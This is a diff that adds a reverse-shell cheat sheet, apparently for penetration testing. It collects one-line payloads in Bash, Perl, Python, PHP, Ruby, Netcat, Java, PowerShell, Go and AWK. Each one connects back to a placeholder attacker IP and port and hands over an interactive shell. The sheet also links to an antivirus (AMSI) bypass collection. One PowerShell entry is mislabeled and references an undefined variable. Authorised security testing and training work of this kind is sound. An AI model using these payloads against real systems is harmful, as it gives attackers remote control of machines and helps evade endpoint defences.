@@ -1,0 +1,66 @@
+# Bash TCP reverse-shell
+bash -i >& /dev/tcp/<attacker_IP>/<port> 0>&1
+
+# Bash TCP reverse-shell #2
+0<&196;exec 196<>/dev/tcp/<attacker_IP>/<port>; sh <&196 >&196 2>&196
+% reverse shell
+
+# Bash UDP reverse-shell
+sh -i >& /dev/udp/<attacker_IP>/<port> 0>&1
+
+# PERL reverse-shell #1
+perl -e 'use Socket;$i="<attacker_IP>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# PERL reverse-shell #2
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<attacker_IP>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+# PERL reverse-shell Windows only
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<attacker_IP>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+# Python reverse-shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_IP>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# Python reverse-shell IPv6
+python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<attacker_ipv6_IP>",<port>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
+
+# PHP reverse-shell
+php -r '$sock=fsockopen("<attacker_IP>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Pentest Monkey Reverse Shell for PHP (Link: http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+cp /usr/share/webshells/php/php-reverse-shell.php .
+
+# Ruby reverse-shell version 1
+ruby -rsocket -e'f=TCPSocket.open("<attacker_IP>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Ruby reverse-shell version 2
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# Netcat reverse-shell
+nc -e /bin/sh <attacker_ip> <port>
+
+# Netcat reverse-shell without '-e'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f
+
+# Java reverse-shell
+echo "r = Runtime.getRuntime()" && echo 'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<attacker_ip>/<port>;cat <&5 | while read line; do' && echo '\$line 2>&5 >&5; done"] as String[])' && echo "p.waitFor()"
+
+# xterm (To catch the incoming xterm, start an X-Server - :1 – which listens on TCP port 6001)
+xterm -display <attacker_IP>:1
+
+# Powershell reverse-shell #1
+$client = New-Object System.Net.Sockets.TCPClient("<attacker_IP>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+# Powershell reverse-shell #1
+$callback = New-Object System.Net.Sockets.TCPClient("IP ADDRESS",53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()
+
+# Golang reverse-shell
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<attacker_IP>:<port>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+
+# AWK reverse-shell
+awk 'BEGIN {s = "/inet/tcp/0/<attacker_IP>/<port>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+# Windows reverse-Shell 
+see https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner
+
+# Other Resources 
+echo "Amsi-Bypass-Powershell: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell " && echo "ther Reverse Shell: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
